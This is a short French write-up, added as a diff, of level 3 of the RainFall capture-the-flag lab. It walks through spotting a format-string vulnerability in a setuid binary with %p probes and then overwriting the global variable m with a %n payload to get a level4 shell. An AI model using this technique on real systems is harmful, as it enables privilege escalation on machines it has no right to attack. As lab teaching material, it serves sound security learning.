@@ -1,0 +1,40 @@
+J'arrive sur le niveau 3 Et je tombe sur un fichier level03
+
+	level3@RainFall:~$ ls -la level3
+	-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
+
+Celui-ci dispose des droit d'execution de level4.
+
+	level3@RainFall:~$ file level3
+	level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
+
+Je vais l'envoyez sur mon linux et le decompiler avec cutter.
+
+C'est le même principe qu'avant une fonction main qui ne prend aucun argument et qui appel une fonction v.
+La fonction v appel le fonction fgets et la stock dans une variable pui l'envoie a printf. La fonction fgets et protéger contre le buffer overflow, elle ne prend que 512 charatères.
+
+Après quelque test je remarque que si j'injecte des %p dans la string printf m'écrit des valeurs.
+
+
+level3@RainFall:~$ ./level3
+AAAA %p %p %p %p
+AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
+
+level3@RainFall:~$ ./level3
+AAAABBBB %p %p %p %p %p %p %p %p %p
+AAAABBBB 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x42424242 0x20702520 0x25207025 0x70252070 0x20702520
+
+Il semble que nous soyons sur une vuln type chaîne de format
+
+Une fois print le programme compare une variable global avec la valeur 64, si 64 ce trouve dans la variable alors nous pouvons accéder a un shell Du coup je vais chercher l'addresse de la variable _m
+
+	info variable
+	0x0804988c  m
+
+Le principe est de récrire le contenu de la variable avec le nombre que l'on souhaite pour cela on vas utiliser %n
+
+	cat <( python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"') - | ./level3
+	�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+	Wait what?!
+	whoami
+	level4
